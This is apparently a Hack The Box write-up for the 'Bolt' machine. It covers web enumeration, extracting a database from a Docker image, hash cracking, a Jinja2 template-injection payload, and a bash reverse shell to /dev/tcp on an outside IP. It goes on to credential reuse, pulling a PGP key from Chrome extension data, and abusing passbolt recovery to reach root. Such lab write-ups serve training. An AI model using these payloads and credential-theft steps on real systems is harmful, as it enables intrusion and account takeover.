---
title: "[HTB] Machine: Bolt"
description: "[HTB] Machine: Bolt"
date: 2023-09-23
menu:
  sidebar:
    name: "[HTB] Machine: Bolt"
    identifier: htb-machine-Bolt
    parent: htb-machines-linux
    weight: 10
hero: images/bolt.png
tags: ["HTB", "vhosts", "docker", "docker-tar", "roundcube", "webmail", "passbolt", "dive", "sqlite", "hashcat", "source-code", "ssti", "payloadsallthethings", "chrome", "john", "python"]
---

# Bolt
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.11.114 -T4                                                               
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 11:56 BST
Nmap scan report for 10.10.11.114 (10.10.11.114)
Host is up (0.17s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 723.12 seconds

```
```
└─$ nmap -Pn -p22,80,443 -sC -sV 10.10.11.114 -T4
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 12:13 BST
Nmap scan report for 10.10.11.114 (10.10.11.114)
Host is up (0.17s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-title: 400 The plain HTTP request was sent to HTTPS port
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.26 seconds

```

- Web server

![](./images/1.png)

![](./images/2.png)

![](./images/3.png)

- `vhosts`
  - From the request above we saw `passbolt.bolt.htb`
  - Let's check others

```
└─$ wfuzz -u http://bolt.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host: FUZZ.bolt.htb' --hh 30341 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://bolt.htb/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================

000000038:   302        3 L      24 W       219 Ch      "demo"                                                                                                                                                                     
000000002:   200        98 L     322 W      4943 Ch     "mail"                                                                                                                                                                     

Total time: 604.1514
Processed Requests: 19966
Filtered Requests: 19964
Requests/sec.: 33.04800

```
- Visiting port `443` redirect to `passbolt.bolt.htb`
  - We can use `ffuf` to filter out redirects to `passbolt`
```
└─$ ffuf -u https://10.10.11.114 -H "Host: FUZZ.bolt.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fr passbolt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.0.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://10.10.11.114
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.bolt.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
 :: Filter           : Regexp: passbolt
________________________________________________

:: Progress: [19966/19966] :: Job [1/1] :: 24 req/sec :: Duration: [0:13:04] :: Errors: 0 ::
                                                                                           
```
- `passbolt.bolt.htb`
  - Port `443`

![](./images/4.png)

- `mail.bolt.htb`

![](./images/5.png)

- `demo.bolt.htb`

![](./images/6.png)

- `bolt.htb`
  - Download the `tar` from `http://bolt.htb/download`

![](./images/1.png)

![](./images/7.png)


- `gobuster`
```
└─$ gobuster dir -u http://bolt.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  --no-error 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://bolt.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/23 21:25:00 Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 26293]
/login                (Status: 200) [Size: 9287]
/download             (Status: 200) [Size: 18570]
/index                (Status: 308) [Size: 239] [--> http://bolt.htb/]
/register             (Status: 200) [Size: 11038]
/services             (Status: 200) [Size: 22443]
/profile              (Status: 500) [Size: 290]
/pricing              (Status: 200) [Size: 31731]
/logout               (Status: 302) [Size: 209] [--> http://bolt.htb/]
/sign-in              (Status: 200) [Size: 9287]
/sign-up              (Status: 200) [Size: 11038]

```
```
└─$ gobuster dir -u http://demo.bolt.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50  --no-error 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://demo.bolt.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/09/23 21:31:21 Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 9710]
/register             (Status: 200) [Size: 11066]
/logout               (Status: 302) [Size: 219] [--> http://demo.bolt.htb/login]

```

## Foothold
- Let's analyze `image.tar`
  - It's a docker image
    - https://www.mikulskibartosz.name/what-is-inside-a-docker-image
    - https://theartofmachinery.com/2021/03/18/reverse_engineering_a_docker_image.html
    - https://blog.oddbit.com/post/2015-02-13-unpacking-docker-images/
  - Each directory has `layer.tar`
```
└─$ tree -L 2
.
├── 187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
├── 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
│   ├── json
│   ├── layer.tar
│   └── VERSION
├── ferox-http_bolt_htb-1695500633.state
├── manifest.json
└── repositories
```
- We can use [dive](https://github.com/wagoodman/dive) to analyze the image

![](./images/8.png)

- We have a `db.sqlite3` which is removed in latest layers

![](./images/9.png)

![](./images/10.png)

- Let's grab the layer `id` and check the content of the `layer.tar`
  - `a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2`
```
┌──(kali㉿kali)-[~/bolt/image/a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2]
└─$ tar tf layer.tar 
db.sqlite3
root/
root/.ash_history
tmp/
```

- Let's check the content
```
└─$ sqlite3 db.sqlite3 
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .table
User
sqlite> .schema User
CREATE TABLE IF NOT EXISTS "User" (
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        password BLOB, 
        email_confirmed BOOLEAN, 
        profile_update VARCHAR(80), 
        PRIMARY KEY (id), 
        UNIQUE (username), 
        UNIQUE (email)
);
sqlite> select * from User;
1|admin|admin@bolt.htb|$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.||
sqlite> 
```

- Let's try to crack
```
└─$ hashcat -m 500 hash /usr/share/wordlists/rockyou.txt  
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU
...
$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt               
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
Time.Started.....: Mon Sep 25 17:25:28 2023 (12 secs)
Time.Estimated...: Mon Sep 25 17:25:40 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    13944 H/s (8.85ms) @ Accel:64 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 172800/14344385 (1.20%)
Rejected.........: 0/172800 (0.00%)
Restore.Point....: 172672/14344385 (1.20%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1000
Candidate.Engine.: Device Generator
Candidates.#1....: derek25 -> danniela
Hardware.Mon.#1..: Util: 98%

Started: Mon Sep 25 17:25:27 2023
Stopped: Mon Sep 25 17:25:42 2023

```

- The creds only work for `http://bolt.htb/login`
  - But nothing interesting

![](./images/11.png)

- We also have `demo.bolt.htb`
  - Let's check the source code
  - Layer 3 according to `dive`

```
┌──(kali㉿kali)-[~/bolt/image/41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app]
└─$ tree -L 2        
.
├── base
│   ├── forms.py
│   ├── __init__.py
│   ├── models.py
│   ├── __pycache__
│   ├── routes.py
│   ├── static
│   ├── templates
│   └── util.py
├── home
│   ├── forms.py
│   ├── __init__.py
│   ├── __pycache__
│   ├── routes.py
│   └── templates
├── __init__.py
└── __pycache__
    └── __init__.cpython-39.pyc

9 directories, 10 files
```

- If we check the `routes.py` in `base`, we have a code for registration: `XNSS-HSJW-3NGU-8XTJ`
```
@blueprint.route('/register', methods=['GET', 'POST'])
def register():
    login_form = LoginForm(request.form)
    create_account_form = CreateAccountForm(request.form)
    if 'register' in request.form:

        username  = request.form['username']
        email     = request.form['email'   ]
        code      = request.form['invite_code']
        if code != 'XNSS-HSJW-3NGU-8XTJ':
            return render_template('code-500.html')
        data = User.query.filter_by(email=email).first()
        if data is None and code == 'XNSS-HSJW-3NGU-8XTJ':
            # Check usename exists
            user = User.query.filter_by(username=username).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Username already registered',
                                    success=False,
                                    form=create_account_form)

            # Check email exists
            user = User.query.filter_by(email=email).first()
            if user:
                return render_template( 'accounts/register.html', 
                                    msg='Email already registered', 
                                    success=False,
                                    form=create_account_form)

            # else we can create the user
            user = User(**request.form)
            db.session.add(user)
            db.session.commit()

            return render_template( 'accounts/register.html', 
                                msg='User created please <a href="/login">login</a>', 
                                success=True,
                                form=create_account_form)

    else:
        return render_template( 'accounts/register.html', form=create_account_form)

```

- Let's register in `demo.bolt.htb` using the code

![](./images/12.png)

![](./images/13.png)

- The page has nothing interesting
  - So we return back to the code
  - We have a `home/routes.py`
    - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti
```
@blueprint.route('/confirm/changes/<token>')
def confirm_changes(token):
    """Confirmation Token"""
    try:
        email = ts.loads(token, salt="changes-confirm-key", max_age=86400)
    except:
        abort(404)
    user = User.query.filter_by(username=email).first_or_404()
    name = user.profile_update
    template = open('templates/emails/update-name.html', 'r').read()
    msg = Message(
            recipients=[f'{user.email}'],
            sender = 'support@example.com',
            reply_to = 'support@example.com',
            subject = "Your profile changes have been confirmed."
        )
    msg.html = render_template_string(template % name)
    mail.send(msg)

    return render_template('index.html')

```

- So we have a possible `SSTI`
  - It can be trigered via changing profile settings
  - To be specific `Name` parameter

![](./images/14.png)

![](./images/16.png)

![](./images/15.png)

![](./images/17.png)

- It looks like it works
  - https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#jinja2-python
  - The payload: `{{ namespace.__init__.__globals__.os.popen('id').read() }}`

![](./images/18.png)

- Let's get reverse shell
  - `{{ namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.16.9/6666 0>&1"').read() }}`

![](./images/19.png)

## User
- Enumerate
```
www-data@bolt:~$ cat /var/www/dev/config.py
cat dev/config.py
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```
```
www-data@bolt:~$ cat /var/www/demo/config.py
cat demo/config.py
"""Flask Configuration"""
#SQLALCHEMY_DATABASE_URI = 'sqlite:///database.db'
SQLALCHEMY_DATABASE_URI = 'mysql://bolt_dba:dXUUHSW9vBpH5qRB@localhost/boltmail'
SQLALCHEMY_TRACK_MODIFICATIONS = True
SECRET_KEY = 'kreepandcybergeek'
MAIL_SERVER = 'localhost'
MAIL_PORT = 25
MAIL_USE_TLS = False
MAIL_USE_SSL = False
#MAIL_DEBUG = app.debug
MAIL_USERNAME = None
MAIL_PASSWORD = None
DEFAULT_MAIL_SENDER = 'support@bolt.htb'
```
```
www-data@bolt:~$ cat /var/www/roundcube/config/config.inc.php
cat roundcube/config/config.inc.php
<?php

/* Local configuration for Roundcube Webmail */

// ----------------------------------
// SQL DATABASE
// ----------------------------------
// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// Note: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
// Note: Various drivers support various additional arguments for connection,
//       for Mysql: key, cipher, cert, capath, ca, verify_server_cert,
//       for Postgres: application_name, sslmode, sslcert, sslkey, sslrootcert, sslcrl, sslcompression, service.
//       e.g. 'mysql://roundcube:@localhost/roundcubemail?verify_server_cert=false'
$config['db_dsnw'] = 'mysql://roundcubeuser:WXg5He2wHt4QYHuyGET@localhost/roundcube';
// $config['enable_installer'] = true;
// Log sent messages to <log_dir>/sendmail.log or to syslog
$config['smtp_log'] = false;
```

- None of these passwords work
  - But we also have `passbolt`
  - `/etc/passbolt/passbolt.php`
```
...

    // Database configuration.
    'Datasources' => [
        'default' => [
            'host' => 'localhost',
            'port' => '3306',
            'username' => 'passbolt',
            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
            'database' => 'passboltdb',
        ],
    ],

...
```

- And it works for `eddie`
  - Let's connect via `ssh`

![](./images/20.png)


## Root
- We have a message from the `clark`

![](./images/21.png)

- Looks like we should look for a key
  - We have `.config` folder in `eddie`'s home
  - Inside we have `google-chrome`
    - Related to the message we saw from `clark`
  - `clark` mentioned plugins/extensions
    - We have 3
```
eddie@bolt:~$ ls -lha /home/eddie/.config/google-chrome/Default/Extensions/
total 20K
drwx------  5 eddie eddie 4.0K Feb 25  2021 .
drwx------ 23 eddie eddie 4.0K Aug  4  2021 ..
drwx------  3 eddie eddie 4.0K Feb 25  2021 didegimhafipceonhjepacocaffmoppf
drwx------  3 eddie eddie 4.0K Feb 25  2021 nmmhkkegccagdldgiimedpiccmgmieda
drwx------  3 eddie eddie 4.0K Feb 25  2021 pkedcjkdefgpdelpbcmbmeomcjbeemfm
```

- Let's find the `passbolt` extension
```
eddie@bolt:~/.config/google-chrome/Default/Extensions$ grep -ir passbolt | cut -d'/' -f1 | uniq
didegimhafipceonhjepacocaffmoppf
```

- Now let's look for key
```
eddie@bolt:~/.config/google-chrome/Default$ grep -nr "didegimhafipceonhjepacocaffmoppf" . | cut -d'/' -f2 | uniq
Favicons matches
Preferences:1:{"account_id_migration_state":2,"account_tracker_service_last_update":"13258762424334951","alternate_error_pages":{"backup":true},"announcement_notification_service_first_run_time":"13258762424167263","autocomplete":{"retention_policy_last_version":88},"autofill":{"orphan_rows_removed":true},"browser":{"has_seen_welcome_page":true,"window_placement":{"bottom":1045,"left":429,"maximized":true,"right":1239,"top":39,"work_area_bottom":1200,"work_area_left":72,"work_area_right":1920,"work_area_top":27}},"countryid_at_install":21843,"custom_links":{"initialized":true,"list":[{"isMostVisited":true,"title":"Passbolt","url":"https:
History Provider Cache matches
DownloadMetadata matches
History matches
shared_proto_db
Local Extension Settings
Sessions
```
```
eddie@bolt:~/.config/google-chrome/Default$ grep -n "PRIVATE" "Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log"
Binary file Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

- We found a key inside using `strings "Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log | less`

![](./images/22.png)

- Let's crack it
```
└─$ gpg2john priv.key > priv.key.hash

File priv.key
```
```
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt priv.key.hash            
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 16777216 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 8 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:04:00 0.08% (ETA: 2023-09-30 02:25) 0g/s 60.41p/s 60.41c/s 60.41C/s teamoj..taztaz
0g 0:00:04:03 0.08% (ETA: 2023-09-30 02:22) 0g/s 60.42p/s 60.42c/s 60.42C/s langlang..lamont1
merrychristmas   (Eddie Johnson)     
1g 0:00:11:49 DONE (2023-09-26 19:07) 0.001409g/s 60.39p/s 60.39c/s 60.39C/s merrychristmas..menudo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

- We need this key to able to recover the password
  - https://community.passbolt.com/t/recover-account-on-a-network-without-email/1394
  - We have to visit https://passbolt.bolt.htb/ and enter `eddie@bolt.htb`
  - Then we connect to `db` to retrieve `user_id` and `token`

```
eddie@bolt:~/.config/google-chrome/Default$ mysql -u passbolt -p'rT2;jW7<eY8!dX8}pQ8%' passboltdb
mysql: [Warning] Using a password on the command line interface can be insecure.
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 379
Server version: 8.0.26-0ubuntu0.20.04.2 (Ubuntu)

Copyright (c) 2000, 2021, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> select id from users where username = 'eddie@bolt.htb';
+--------------------------------------+
| id                                   |
+--------------------------------------+
| 4e184ee6-e436-47fb-91c9-dccb57f250bc |
+--------------------------------------+
1 row in set (0.00 sec)

mysql> select token from authentication_tokens where user_id = '4e184ee6-e436-47fb-91c9-dccb57f250bc' and type = 'recover';
Empty set (0.00 sec)

mysql> select token from authentication_tokens where user_id = '4e184ee6-e436-47fb-91c9-dccb57f250bc' and type = 'recover';
+--------------------------------------+
| token                                |
+--------------------------------------+
| 2b4571b7-6cb7-4572-b1d2-ea7bdc9e8388 |
+--------------------------------------+
1 row in set (0.00 sec)

mysql> 
```

- So the link we have to visit is `https://passbolt.bolt.htb/setup/recover/4e184ee6-e436-47fb-91c9-dccb57f250bc/2b4571b7-6cb7-4572-b1d2-ea7bdc9e8388`
  - When we visit the link we have to install the extension
  - After installation, we have window with `Private key` 

![](./images/23.png)

![](./images/24.png)

- After entering the private key, we are asked a passphrase, that we cracked before
  - Enter passphrase and click `Next`
  - Then click `Next` again

![](./images/25.png)

- Now we have an access to password manager

![](./images/26.png)

- Switch to `root` and get flag

![](./images/27.png)
